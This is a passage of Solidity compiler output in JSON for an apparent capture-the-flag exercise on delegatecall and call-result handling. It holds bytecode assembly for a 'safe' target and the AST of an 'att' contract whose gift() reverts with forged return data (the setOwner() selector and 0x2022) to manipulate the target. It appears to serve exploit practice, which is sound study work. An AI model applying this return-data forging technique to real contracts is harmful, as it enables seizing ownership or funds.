											"name": "PUSH",
											"value": "1F"
										},
										{
											"begin": 1492,
											"end": 1537,
											"name": "AND"
										},
										{
											"begin": 1492,
											"end": 1537,
											"name": "DUP1"
										},
										{
											"begin": 1492,
											"end": 1537,
											"name": "ISZERO"
										},
										{
											"begin": 1492,
											"end": 1537,
											"name": "PUSH [tag]",
											"value": "51"
										},
										{
											"begin": 1492,
											"end": 1537,
											"name": "JUMPI"
										},
										{
											"begin": 1492,
											"end": 1537,
											"name": "DUP1"
										},
										{
											"begin": 1492,
											"end": 1537,
											"name": "DUP3"
										},
										{
											"begin": 1492,
											"end": 1537,
											"name": "SUB"
										},
										{
											"begin": 1492,
											"end": 1537,
											"name": "DUP1"
										},
										{
											"begin": 1492,
											"end": 1537,
											"name": "MLOAD"
										},
										{
											"begin": 1492,
											"end": 1537,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 1492,
											"end": 1537,
											"name": "DUP4"
										},
										{
											"begin": 1492,
											"end": 1537,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1492,
											"end": 1537,
											"name": "SUB"
										},
										{
											"begin": 1492,
											"end": 1537,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 1492,
											"end": 1537,
											"name": "EXP"
										},
										{
											"begin": 1492,
											"end": 1537,
											"name": "SUB"
										},
										{
											"begin": 1492,
											"end": 1537,
											"name": "NOT"
										},
										{
											"begin": 1492,
											"end": 1537,
											"name": "AND"
										},
										{
											"begin": 1492,
											"end": 1537,
											"name": "DUP2"
										},
										{
											"begin": 1492,
											"end": 1537,
											"name": "MSTORE"
										},
										{
											"begin": 1492,
											"end": 1537,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1492,
											"end": 1537,
											"name": "ADD"
										},
										{
											"begin": 1492,
											"end": 1537,
											"name": "SWAP2"
										},
										{
											"begin": 1492,
											"end": 1537,
											"name": "POP"
										},
										{
											"begin": 1492,
											"end": 1537,
											"name": "tag",
											"value": "51"
										},
										{
											"begin": 1492,
											"end": 1537,
											"name": "JUMPDEST"
										},
										{
											"begin": 1492,
											"end": 1537,
											"name": "POP"
										},
										{
											"begin": 1492,
											"end": 1537,
											"name": "SWAP2"
										},
										{
											"begin": 1492,
											"end": 1537,
											"name": "POP"
										},
										{
											"begin": 1492,
											"end": 1537,
											"name": "POP"
										},
										{
											"begin": 1492,
											"end": 1537,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1492,
											"end": 1537,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1492,
											"end": 1537,
											"name": "MLOAD"
										},
										{
											"begin": 1492,
											"end": 1537,
											"name": "DUP1"
										},
										{
											"begin": 1492,
											"end": 1537,
											"name": "DUP4"
										},
										{
											"begin": 1492,
											"end": 1537,
											"name": "SUB"
										},
										{
											"begin": 1492,
											"end": 1537,
											"name": "DUP2"
										},
										{
											"begin": 1492,
											"end": 1537,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1492,
											"end": 1537,
											"name": "DUP7"
										},
										{
											"begin": 1492,
											"end": 1537,
											"name": "GAS"
										},
										{
											"begin": 1492,
											"end": 1537,
											"name": "CALL"
										},
										{
											"begin": 1492,
											"end": 1537,
											"name": "SWAP2"
										},
										{
											"begin": 1492,
											"end": 1537,
											"name": "POP"
										},
										{
											"begin": 1492,
											"end": 1537,
											"name": "POP"
										},
										{
											"begin": 1483,
											"end": 1537,
											"name": "SWAP1"
										},
										{
											"begin": 1483,
											"end": 1537,
											"name": "POP"
										},
										{
											"begin": 1556,
											"end": 1563,
											"name": "DUP1"
										},
										{
											"begin": 1548,
											"end": 1578,
											"name": "ISZERO"
										},
										{
											"begin": 1548,
											"end": 1578,
											"name": "ISZERO"
										},
										{
											"begin": 1548,
											"end": 1578,
											"name": "PUSH [tag]",
											"value": "52"
										},
										{
											"begin": 1548,
											"end": 1578,
											"name": "JUMPI"
										},
										{
											"begin": 1548,
											"end": 1578,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1548,
											"end": 1578,
											"name": "MLOAD"
										},
										{
											"begin": 1548,
											"end": 1578,
											"name": "PUSH",
											"value": "8C379A000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 1548,
											"end": 1578,
											"name": "DUP2"
										},
										{
											"begin": 1548,
											"end": 1578,
											"name": "MSTORE"
										},
										{
											"begin": 1548,
											"end": 1578,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 1548,
											"end": 1578,
											"name": "ADD"
										},
										{
											"begin": 1548,
											"end": 1578,
											"name": "DUP1"
										},
										{
											"begin": 1548,
											"end": 1578,
											"name": "DUP1"
										},
										{
											"begin": 1548,
											"end": 1578,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1548,
											"end": 1578,
											"name": "ADD"
										},
										{
											"begin": 1548,
											"end": 1578,
											"name": "DUP3"
										},
										{
											"begin": 1548,
											"end": 1578,
											"name": "DUP2"
										},
										{
											"begin": 1548,
											"end": 1578,
											"name": "SUB"
										},
										{
											"begin": 1548,
											"end": 1578,
											"name": "DUP3"
										},
										{
											"begin": 1548,
											"end": 1578,
											"name": "MSTORE"
										},
										{
											"begin": 1548,
											"end": 1578,
											"name": "PUSH",
											"value": "B"
										},
										{
											"begin": 1548,
											"end": 1578,
											"name": "DUP2"
										},
										{
											"begin": 1548,
											"end": 1578,
											"name": "MSTORE"
										},
										{
											"begin": 1548,
											"end": 1578,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1548,
											"end": 1578,
											"name": "ADD"
										},
										{
											"begin": 1548,
											"end": 1578,
											"name": "DUP1"
										},
										{
											"begin": 1548,
											"end": 1578,
											"name": "PUSH",
											"value": "63616C6C206661696C6564000000000000000000000000000000000000000000"
										},
										{
											"begin": 1548,
											"end": 1578,
											"name": "DUP2"
										},
										{
											"begin": 1548,
											"end": 1578,
											"name": "MSTORE"
										},
										{
											"begin": 1548,
											"end": 1578,
											"name": "POP"
										},
										{
											"begin": 1548,
											"end": 1578,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1548,
											"end": 1578,
											"name": "ADD"
										},
										{
											"begin": 1548,
											"end": 1578,
											"name": "SWAP2"
										},
										{
											"begin": 1548,
											"end": 1578,
											"name": "POP"
										},
										{
											"begin": 1548,
											"end": 1578,
											"name": "POP"
										},
										{
											"begin": 1548,
											"end": 1578,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1548,
											"end": 1578,
											"name": "MLOAD"
										},
										{
											"begin": 1548,
											"end": 1578,
											"name": "DUP1"
										},
										{
											"begin": 1548,
											"end": 1578,
											"name": "SWAP2"
										},
										{
											"begin": 1548,
											"end": 1578,
											"name": "SUB"
										},
										{
											"begin": 1548,
											"end": 1578,
											"name": "SWAP1"
										},
										{
											"begin": 1548,
											"end": 1578,
											"name": "REVERT"
										},
										{
											"begin": 1548,
											"end": 1578,
											"name": "tag",
											"value": "52"
										},
										{
											"begin": 1548,
											"end": 1578,
											"name": "JUMPDEST"
										},
										{
											"begin": 1175,
											"end": 1586,
											"name": "POP"
										},
										{
											"begin": 1175,
											"end": 1586,
											"name": "POP"
										},
										{
											"begin": 1175,
											"end": 1586,
											"name": "POP"
										},
										{
											"begin": 1175,
											"end": 1586,
											"name": "POP"
										},
										{
											"begin": 1175,
											"end": 1586,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 731,
											"end": 751,
											"name": "tag",
											"value": "27"
										},
										{
											"begin": 731,
											"end": 751,
											"name": "JUMPDEST"
										},
										{
											"begin": 731,
											"end": 751,
											"name": "PUSH",
											"value": "2"
										},
										{
											"begin": 731,
											"end": 751,
											"name": "SLOAD"
										},
										{
											"begin": 731,
											"end": 751,
											"name": "DUP2"
										},
										{
											"begin": 731,
											"end": 751,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 2195,
											"end": 2384,
											"name": "tag",
											"value": "30"
										},
										{
											"begin": 2195,
											"end": 2384,
											"name": "JUMPDEST"
										},
										{
											"begin": 2240,
											"end": 2241,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2234,
											"end": 2239,
											"name": "PUSH",
											"value": "2"
										},
										{
											"begin": 2234,
											"end": 2241,
											"name": "DUP2"
										},
										{
											"begin": 2234,
											"end": 2241,
											"name": "SWAP1"
										},
										{
											"begin": 2234,
											"end": 2241,
											"name": "SSTORE"
										},
										{
											"begin": 2234,
											"end": 2241,
											"name": "POP"
										},
										{
											"begin": 2267,
											"end": 2272,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2267,
											"end": 2272,
											"name": "DUP1"
										},
										{
											"begin": 2267,
											"end": 2272,
											"name": "SWAP1"
										},
										{
											"begin": 2267,
											"end": 2272,
											"name": "SLOAD"
										},
										{
											"begin": 2267,
											"end": 2272,
											"name": "SWAP1"
										},
										{
											"begin": 2267,
											"end": 2272,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 2267,
											"end": 2272,
											"name": "EXP"
										},
										{
											"begin": 2267,
											"end": 2272,
											"name": "SWAP1"
										},
										{
											"begin": 2267,
											"end": 2272,
											"name": "DIV"
										},
										{
											"begin": 2267,
											"end": 2272,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 2267,
											"end": 2272,
											"name": "AND"
										},
										{
											"begin": 2255,
											"end": 2272,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 2255,
											"end": 2272,
											"name": "AND"
										},
										{
											"begin": 2255,
											"end": 2265,
											"name": "CALLER"
										},
										{
											"begin": 2255,
											"end": 2272,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 2255,
											"end": 2272,
											"name": "AND"
										},
										{
											"begin": 2255,
											"end": 2272,
											"name": "EQ"
										},
										{
											"begin": 2252,
											"end": 2309,
											"name": "ISZERO"
										},
										{
											"begin": 2252,
											"end": 2309,
											"name": "PUSH [tag]",
											"value": "54"
										},
										{
											"begin": 2252,
											"end": 2309,
											"name": "JUMPI"
										},
										{
											"begin": 2295,
											"end": 2297,
											"name": "PUSH",
											"value": "32"
										},
										{
											"begin": 2288,
											"end": 2293,
											"name": "PUSH",
											"value": "2"
										},
										{
											"begin": 2288,
											"end": 2293,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2288,
											"end": 2297,
											"name": "DUP3"
										},
										{
											"begin": 2288,
											"end": 2297,
											"name": "DUP3"
										},
										{
											"begin": 2288,
											"end": 2297,
											"name": "SLOAD"
										},
										{
											"begin": 2288,
											"end": 2297,
											"name": "ADD"
										},
										{
											"begin": 2288,
											"end": 2297,
											"name": "SWAP3"
										},
										{
											"begin": 2288,
											"end": 2297,
											"name": "POP"
										},
										{
											"begin": 2288,
											"end": 2297,
											"name": "POP"
										},
										{
											"begin": 2288,
											"end": 2297,
											"name": "DUP2"
										},
										{
											"begin": 2288,
											"end": 2297,
											"name": "SWAP1"
										},
										{
											"begin": 2288,
											"end": 2297,
											"name": "SSTORE"
										},
										{
											"begin": 2288,
											"end": 2297,
											"name": "POP"
										},
										{
											"begin": 2252,
											"end": 2309,
											"name": "tag",
											"value": "54"
										},
										{
											"begin": 2252,
											"end": 2309,
											"name": "JUMPDEST"
										},
										{
											"begin": 2334,
											"end": 2340,
											"name": "PUSH",
											"value": "2022"
										},
										{
											"begin": 2322,
											"end": 2330,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 2322,
											"end": 2330,
											"name": "SLOAD"
										},
										{
											"begin": 2322,
											"end": 2340,
											"name": "EQ"
										},
										{
											"begin": 2319,
											"end": 2377,
											"name": "ISZERO"
										},
										{
											"begin": 2319,
											"end": 2377,
											"name": "PUSH [tag]",
											"value": "55"
										},
										{
											"begin": 2319,
											"end": 2377,
											"name": "JUMPI"
										},
										{
											"begin": 2363,
											"end": 2365,
											"name": "PUSH",
											"value": "32"
										},
										{
											"begin": 2356,
											"end": 2361,
											"name": "PUSH",
											"value": "2"
										},
										{
											"begin": 2356,
											"end": 2361,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2356,
											"end": 2365,
											"name": "DUP3"
										},
										{
											"begin": 2356,
											"end": 2365,
											"name": "DUP3"
										},
										{
											"begin": 2356,
											"end": 2365,
											"name": "SLOAD"
										},
										{
											"begin": 2356,
											"end": 2365,
											"name": "ADD"
										},
										{
											"begin": 2356,
											"end": 2365,
											"name": "SWAP3"
										},
										{
											"begin": 2356,
											"end": 2365,
											"name": "POP"
										},
										{
											"begin": 2356,
											"end": 2365,
											"name": "POP"
										},
										{
											"begin": 2356,
											"end": 2365,
											"name": "DUP2"
										},
										{
											"begin": 2356,
											"end": 2365,
											"name": "SWAP1"
										},
										{
											"begin": 2356,
											"end": 2365,
											"name": "SSTORE"
										},
										{
											"begin": 2356,
											"end": 2365,
											"name": "POP"
										},
										{
											"begin": 2319,
											"end": 2377,
											"name": "tag",
											"value": "55"
										},
										{
											"begin": 2319,
											"end": 2377,
											"name": "JUMPDEST"
										},
										{
											"begin": 2195,
											"end": 2384,
											"name": "JUMP",
											"value": "[out]"
										}
									]
								}
							}
						},
						"methodIdentifiers": {
							"complete()": "522e1177",
							"getReturns()": "ade58ccb",
							"gift(address)": "cbfc4bce",
							"isCompleted()": "fa391c64",
							"score()": "efedc669",
							"setOwner()": "40caae06",
							"setPassword(uint256)": "68e9a07e"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.4.26+commit.4563c3fc\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"constant\":false,\"inputs\":[],\"name\":\"setOwner\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"complete\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"val\",\"type\":\"uint256\"}],\"name\":\"setPassword\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"getReturns\",\"outputs\":[{\"name\":\"sel\",\"type\":\"bytes4\"},{\"name\":\"val\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"pure\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_target\",\"type\":\"address\"}],\"name\":\"gift\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"score\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"isCompleted\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"shoot/3/delegatecall\\u8c03\\u7528\\u51fa\\u9519/1.sol\":\"safe\"},\"evmVersion\":\"byzantium\",\"libraries\":{},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"shoot/3/delegatecall\\u8c03\\u7528\\u51fa\\u9519/1.sol\":{\"keccak256\":\"0x150ca5968d5b93337be8f184c4689c278930ed780afe3dcbdce68207129bcdc4\",\"urls\":[\"bzzr://c1f2db8df19e3fab196d519a18d4814384a736c045a3e2ea922f690ddfcb9c1e\"]}},\"version\":1}",
					"userdoc": {
						"methods": {}
					}
				}
			}
		},
		"errors": [
			{
				"component": "general",
				"formattedMessage": "shoot/3/delegatecall调用出错/1.sol:30:36: Warning: Initial value for constant variable has to be compile-time constant. This will fail to compile with the next breaking version change.\n    bytes4 internal constant SET = this.setPassword.selector;\r\n                                   ^-----------------------^\n",
				"message": "Initial value for constant variable has to be compile-time constant. This will fail to compile with the next breaking version change.",
				"severity": "warning",
				"sourceLocation": {
					"end": 814,
					"file": "shoot/3/delegatecall调用出错/1.sol",
					"start": 789
				},
				"type": "Warning"
			},
			{
				"component": "general",
				"formattedMessage": "shoot/3/delegatecall调用出错/1.sol:12:5: Warning: Function state mutability can be restricted to pure\n    function gift(address)public view{\r\n    ^ (Relevant source part starts here and spans across multiple lines).\n",
				"message": "Function state mutability can be restricted to pure",
				"severity": "warning",
				"sourceLocation": {
					"end": 571,
					"file": "shoot/3/delegatecall调用出错/1.sol",
					"start": 339
				},
				"type": "Warning"
			}
		],
		"sources": {
			"shoot/3/delegatecall调用出错/1.sol": {
				"ast": {
					"absolutePath": "shoot/3/delegatecall调用出错/1.sol",
					"exportedSymbols": {
						"att": [
							58
						],
						"safe": [
							239
						]
					},
					"id": 240,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1,
							"literals": [
								"solidity",
								"^",
								"0.4",
								".23"
							],
							"nodeType": "PragmaDirective",
							"src": "0:24:0"
						},
						{
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"documentation": null,
							"fullyImplemented": true,
							"id": 58,
							"linearizedBaseContracts": [
								58
							],
							"name": "att",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"id": 3,
									"name": "owner",
									"nodeType": "VariableDeclaration",
									"scope": 58,
									"src": "78:21:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_address",
										"typeString": "address"
									},
									"typeName": {
										"id": 2,
										"name": "address",
										"nodeType": "ElementaryTypeName",
										"src": "78:7:0",
										"typeDescriptions": {
											"typeIdentifier": "t_address",
											"typeString": "address"
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 5,
									"name": "password",
									"nodeType": "VariableDeclaration",
									"scope": 58,
									"src": "106:24:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 4,
										"name": "uint256",
										"nodeType": "ElementaryTypeName",
										"src": "106:7:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 7,
									"name": "sa",
									"nodeType": "VariableDeclaration",
									"scope": 58,
									"src": "137:14:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_contract$_safe_$239",
										"typeString": "contract safe"
									},
									"typeName": {
										"contractScope": null,
										"id": 6,
										"name": "safe",
										"nodeType": "UserDefinedTypeName",
										"referencedDeclaration": 239,
										"src": "137:4:0",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_safe_$239",
											"typeString": "contract safe"
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"constant": true,
									"id": 13,
									"name": "SEL",
									"nodeType": "VariableDeclaration",
									"scope": 58,
									"src": "158:65:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_bytes_memory",
										"typeString": "bytes"
									},
									"typeName": {
										"id": 8,
										"name": "bytes",
										"nodeType": "ElementaryTypeName",
										"src": "158:5:0",
										"typeDescriptions": {
											"typeIdentifier": "t_bytes_storage_ptr",
											"typeString": "bytes"
										}
									},
									"value": {
										"argumentTypes": null,
										"arguments": [
											{
												"argumentTypes": null,
												"hexValue": "7365744f776e65722829",
												"id": 11,
												"isConstant": false,
												"isLValue": false,
												"isPure": true,
												"kind": "string",
												"lValueRequested": false,
												"nodeType": "Literal",
												"src": "210:12:0",
												"subdenomination": null,
												"typeDescriptions": {
													"typeIdentifier": "t_stringliteral_40caae0636c47340f87f218ada657a19040fba2b0ae6fd589ef5ddcb4eb29f48",
													"typeString": "literal_string \"setOwner()\""
												},
												"value": "setOwner()"
											}
										],
										"expression": {
											"argumentTypes": [
												{
													"typeIdentifier": "t_stringliteral_40caae0636c47340f87f218ada657a19040fba2b0ae6fd589ef5ddcb4eb29f48",
													"typeString": "literal_string \"setOwner()\""
												}
											],
											"expression": {
												"argumentTypes": null,
												"id": 9,
												"name": "abi",
												"nodeType": "Identifier",
												"overloadedDeclarations": [],
												"referencedDeclaration": 241,
												"src": "186:3:0",
												"typeDescriptions": {
													"typeIdentifier": "t_magic_abi",
													"typeString": "abi"
												}
											},
											"id": 10,
											"isConstant": false,
											"isLValue": false,
											"isPure": true,
											"lValueRequested": false,
											"memberName": "encodeWithSignature",
											"nodeType": "MemberAccess",
											"referencedDeclaration": null,
											"src": "186:23:0",
											"typeDescriptions": {
												"typeIdentifier": "t_function_abiencodewithsignature_pure$_t_string_memory_ptr_$returns$_t_bytes_memory_ptr_$",
												"typeString": "function (string memory) pure returns (bytes memory)"
											}
										},
										"id": 12,
										"isConstant": false,
										"isLValue": false,
										"isPure": true,
										"kind": "functionCall",
										"lValueRequested": false,
										"names": [],
										"nodeType": "FunctionCall",
										"src": "186:37:0",
										"typeDescriptions": {
											"typeIdentifier": "t_bytes_memory_ptr",
											"typeString": "bytes memory"
										}
									},
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 18,
									"name": "set",
									"nodeType": "VariableDeclaration",
									"scope": 58,
									"src": "230:38:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_bytes4",
										"typeString": "bytes4"
									},
									"typeName": {
										"id": 14,
										"name": "bytes4",
										"nodeType": "ElementaryTypeName",
										"src": "230:6:0",
										"typeDescriptions": {
											"typeIdentifier": "t_bytes4",
											"typeString": "bytes4"
										}
									},
									"value": {
										"argumentTypes": null,
										"expression": {
											"argumentTypes": null,
											"expression": {
												"argumentTypes": null,
												"id": 15,
												"name": "this",
												"nodeType": "Identifier",
												"overloadedDeclarations": [],
												"referencedDeclaration": 267,
												"src": "250:4:0",
												"typeDescriptions": {
													"typeIdentifier": "t_contract$_att_$58",
													"typeString": "contract att"
												}
											},
											"id": 16,
											"isConstant": false,
											"isLValue": false,
											"isPure": false,
											"lValueRequested": false,
											"memberName": "gift",
											"nodeType": "MemberAccess",
											"referencedDeclaration": 45,
											"src": "250:9:0",
											"typeDescriptions": {
												"typeIdentifier": "t_function_external_view$_t_address_$returns$__$",
												"typeString": "function (address) view external"
											}
										},
										"id": 17,
										"isConstant": false,
										"isLValue": false,
										"isPure": false,
										"lValueRequested": false,
										"memberName": "selector",
										"nodeType": "MemberAccess",
										"referencedDeclaration": null,
										"src": "250:18:0",
										"typeDescriptions": {
											"typeIdentifier": "t_bytes4",
											"typeString": "bytes4"
										}
									},
									"visibility": "public"
								},
								{
									"body": {
										"id": 27,
										"nodeType": "Block",
										"src": "305:28:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 25,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 23,
														"name": "sa",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 7,
														"src": "316:2:0",
														"typeDescriptions": {
															"typeIdentifier": "t_contract$_safe_$239",
															"typeString": "contract safe"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 24,
														"name": "addr",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 20,
														"src": "321:4:0",
														"typeDescriptions": {
															"typeIdentifier": "t_contract$_safe_$239",
															"typeString": "contract safe"
														}
													},
													"src": "316:9:0",
													"typeDescriptions": {
														"typeIdentifier": "t_contract$_safe_$239",
														"typeString": "contract safe"
													}
												},
												"id": 26,
												"nodeType": "ExpressionStatement",
												"src": "316:9:0"
											}
										]
									},
									"documentation": null,
									"id": 28,
									"implemented": true,
									"isConstructor": true,
									"isDeclaredConst": false,
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 21,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 20,
												"name": "addr",
												"nodeType": "VariableDeclaration",
												"scope": 28,
												"src": "287:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_contract$_safe_$239",
													"typeString": "contract safe"
												},
												"typeName": {
													"contractScope": null,
													"id": 19,
													"name": "safe",
													"nodeType": "UserDefinedTypeName",
													"referencedDeclaration": 239,
													"src": "287:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_contract$_safe_$239",
														"typeString": "contract safe"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "286:11:0"
									},
									"payable": false,
									"returnParameters": {
										"id": 22,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "305:0:0"
									},
									"scope": 58,
									"src": "275:58:0",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "public"
								},
								{
									"body": {
										"id": 44,
										"nodeType": "Block",
										"src": "372:199:0",
										"statements": [
											{
												"assignments": [
													34
												],
												"declarations": [
													{
														"constant": false,
														"id": 34,
														"name": "sel",
														"nodeType": "VariableDeclaration",
														"scope": 45,
														"src": "383:10:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_bytes4",
															"typeString": "bytes4"
														},
														"typeName": {
															"id": 33,
															"name": "bytes4",
															"nodeType": "ElementaryTypeName",
															"src": "383:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes4",
																"typeString": "bytes4"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 36,
												"initialValue": {
													"argumentTypes": null,
													"hexValue": "30783430636161653036",
													"id": 35,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "395:10:0",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_rational_1087024646_by_1",
														"typeString": "int_const 1087024646"
													},
													"value": "0x40caae06"
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "383:22:0"
											},
											{
												"assignments": [
													38
												],
												"declarations": [
													{
														"constant": false,
														"id": 38,
														"name": "val",
														"nodeType": "VariableDeclaration",
														"scope": 45,
														"src": "416:11:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_bytes32",
															"typeString": "bytes32"
														},
														"typeName": {
															"id": 37,
															"name": "bytes32",
															"nodeType": "ElementaryTypeName",
															"src": "416:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes32",
																"typeString": "bytes32"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 42,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"hexValue": "307832303232",
															"id": 40,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "438:6:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_8226_by_1",
																"typeString": "int_const 8226"
															},
															"value": "0x2022"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_rational_8226_by_1",
																"typeString": "int_const 8226"
															}
														],
														"id": 39,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "430:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_bytes32_$",
															"typeString": "type(bytes32)"
														},
														"typeName": "bytes32"
													},
													"id": 41,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "430:15:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes32",
														"typeString": "bytes32"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "416:29:0"
											},
											{
												"externalReferences": [
													{
														"sel": {
															"declaration": 34,
															"isOffset": false,
															"isSlot": false,
															"src": "490:3:0",
															"valueSize": 1
														}
													},
													{
														"val": {
															"declaration": 38,
															"isOffset": false,
															"isSlot": false,
															"src": "520:3:0",
															"valueSize": 1
														}
													}
												],
												"id": 43,
												"nodeType": "InlineAssembly",
												"operations": "{\n    mstore(0, sel)\n    mstore(0x4, val)\n    revert(0, 0x24)\n}",
												"src": "456:115:0"
											}
										]
									},
									"documentation": null,
									"id": 45,
									"implemented": true,
									"isConstructor": false,
									"isDeclaredConst": true,
									"modifiers": [],
									"name": "gift",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 31,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 30,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 45,
												"src": "353:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 29,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "353:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "352:9:0"
									},
									"payable": false,
									"returnParameters": {
										"id": 32,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "372:0:0"
									},
									"scope": 58,
									"src": "339:232:0",
									"stateMutability": "view",
									"superFunction": null,
									"visibility": "public"
								},
								{
									"body": {
										"id": 56,
										"nodeType": "Block",
										"src": "603:41:0",
										"statements": [
											{
												"expression": {
